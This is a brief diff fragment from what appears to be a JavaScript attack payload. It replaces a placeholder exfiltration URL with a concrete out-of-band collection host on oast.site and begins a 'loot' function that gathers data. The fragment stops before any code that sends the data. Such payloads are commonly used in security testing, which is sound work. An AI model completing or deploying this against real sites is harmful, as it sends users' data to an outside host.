@@ -1,5 +1,5 @@
 (function () {
-  var EXFIL = "https://YOUR-ID.oast.pro";
+  var EXFIL = "https://daqqb5agsqoclmpmuo5gzeamksj6apz4o.oast.site";
 
   function loot(extra) {
     return Object.assign({
